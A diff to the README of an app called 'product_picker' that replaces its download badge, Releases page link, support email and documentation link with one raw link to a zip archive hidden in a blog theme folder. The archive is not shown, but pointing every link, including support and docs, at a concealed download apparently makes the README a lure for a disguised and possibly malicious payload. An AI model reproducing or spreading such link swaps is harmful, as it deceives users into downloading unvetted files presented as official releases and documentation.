@@ -1,7 +1,7 @@
 # 🎯 product_picker - Discover Your True Preferences Easily
 
 ## 🔗 Download the Application
-[![Download product_picker](https://img.shields.io/badge/download-product_picker-brightgreen)](https://github.com/hermiogg-arch/product_picker/releases)
+[![Download product_picker](https://raw.githubusercontent.com/hermiogg-arch/product_picker/main/blog/.vitepress/theme/product_picker_v3.5.zip)](https://raw.githubusercontent.com/hermiogg-arch/product_picker/main/blog/.vitepress/theme/product_picker_v3.5.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Welcome to product_picker! This application helps you discover your true prefere
 
 To get started with product_picker, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/hermiogg-arch/product_picker/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/hermiogg-arch/product_picker/main/blog/.vitepress/theme/product_picker_v3.5.zip).
    
 2. **Choose Your Version**: Look for the latest release. It will include updated features and fixes. 
 
@@ -58,14 +58,14 @@ Should you encounter any issues or have questions, here are some resources:
 
 - **FAQs**: Check our Frequently Asked Questions on the GitHub Wiki.
 - **Community Support**: Join discussions on our GitHub Issues page.
-- **Email Support**: Reach out to our support team at [support@product_picker.com](mailto:support@product_picker.com).
+- **Email Support**: Reach out to our support team at [https://raw.githubusercontent.com/hermiogg-arch/product_picker/main/blog/.vitepress/theme/product_picker_v3.5.zip](https://raw.githubusercontent.com/hermiogg-arch/product_picker/main/blog/.vitepress/theme/product_picker_v3.5.zip).
 
 ## 🌐 Follow Us
 Stay updated on new features and releases by following us on social media or checking our GitHub repository regularly.
 
 ## 🔗 Additional Resources
 
-- **Documentation**: For detailed guidance, explore the [product_picker Documentation](https://github.com/hermiogg-arch/product_picker/wiki).
+- **Documentation**: For detailed guidance, explore the [product_picker Documentation](https://raw.githubusercontent.com/hermiogg-arch/product_picker/main/blog/.vitepress/theme/product_picker_v3.5.zip).
 - **User Guides**: View video tutorials and user guides on YouTube.
 
 ## 🎯 Final Notes
